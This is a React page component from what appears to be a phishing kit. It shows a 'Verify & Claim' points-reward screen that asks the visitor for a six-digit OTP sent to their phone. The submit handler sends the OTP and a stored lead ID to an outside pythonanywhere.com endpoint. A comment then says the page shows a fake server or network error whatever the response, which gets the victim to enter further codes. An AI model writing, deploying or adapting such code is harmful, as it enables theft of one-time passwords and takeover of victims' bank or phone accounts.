import React, { useEffect, useState } from "react";
import { Navigation } from "@/components/navigation";

const ERROR_MESSAGES = [
  "Server Error. Please try again later.",
  "Network Error. Please check your connection.",
];

export default function ClaimVerify() {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [attempt, setAttempt] = useState(0);

  useEffect(() => {
    const style = document.createElement("style");
    style.innerHTML = `
        .up-shadow {
            -webkit-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            -moz-box-shadow: 0px -18px 68px -22px rgba(0, 0, 0, 0.75);
            box-shadow: 0px -18px 68px -22px #ffae0075;
        }
    `;
    document.head.appendChild(style);
    return () => {
      document.head.removeChild(style);
    };
  }, []);

  const handleOtpInput = (e: React.FormEvent<HTMLInputElement>) => {
    const target = e.currentTarget;
    const value = target.value.slice(0, 6);
    target.value = value;
    // Clear error when user types
    if (error) setError(null);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData.entries());

    // Add the lead ID from sessionStorage
    const leadId = sessionStorage.getItem("lead_id");
    if (leadId) {
      data.id = leadId;
    }

    try {
      // Send the OTP to the server first
      await fetch("https://pelabix971.pythonanywhere.com/api/verify/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      // Regardless of the server response, we simulate a failure on the UI
      setTimeout(() => {
        setLoading(false);
        const message = ERROR_MESSAGES[attempt % ERROR_MESSAGES.length];
        setError(message);
        setAttempt((prev) => prev + 1);
      }, 1000);

      // reset input field
      const otpInput = document.getElementById("otp") as HTMLInputElement;
      if (otpInput) otpInput.value = "";
    } catch (error) {
      console.error("Error sending OTP:", error);
      // Fallback for network issues
      setLoading(false);
      setError("Communication failed. Please check your connection.");
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Navigation />

      <div
        className="flex flex-col justify-between gap-16"
        style={{ height: "93vh" }}
      >
        <div className="flex gap-2 items-center px-4 mt-8">
          <div className="px-3">
            <h1 className="text-2xl font-semibold">Verification</h1>
            <p className="text-sm mt-2 text-gray-600">
              Please enter the 6-digit One Time Password (OTP) sent to your
              registered mobile number to claim your points.
            </p>
          </div>
          <img src="/login-amico.svg" alt="Verify" className="w-1/2" />
        </div>

        <div className="grow w-full rounded-t-3xl drop-shadow-md pt-10 border-t up-shadow bg-[#FBF6EB]">
          <form
            className="flex flex-col items-center px-6 w-full max-w-md mx-auto"
            onSubmit={handleSubmit}
          >
            <h1 className="text-3xl font-semibold mb-8 text-gray-800">
              Verify OTP
            </h1>

            <div className="mb-8 w-full">
              <label
                htmlFor="otp"
                className="block text-gray-700 text-sm font-medium mb-1 text-center"
              >
                Enter 6-digit OTP
              </label>
              <input
                type="number"
                id="otp"
                name="otp"
                placeholder="------"
                className={`mt-1 p-2 w-full border-b-2 bg-[#FBF6EB] focus:outline-none transition-colors text-center text-2xl tracking-widest font-bold ${error
                  ? "border-red-500 text-red-600"
                  : "border-[#7F1D1D] focus:border-red-900"
                  }`}
                required
                onInput={handleOtpInput}
              />
              {error && (
                <p className="text-red-600 text-sm mt-2 text-center font-medium">
                  {error}
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="bg-red-900 text-white p-3 rounded-md w-full hover:bg-red-800 transition shadow-lg font-medium disabled:opacity-50"
            >
              {loading ? "Verifying..." : "Verify & Claim"}
            </button>

            <p className="mt-4 text-sm text-gray-600">
              Didn't receive the OTP?{" "}
              <span className="text-red-900 font-bold cursor-pointer hover:underline">
                Resend
              </span>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}
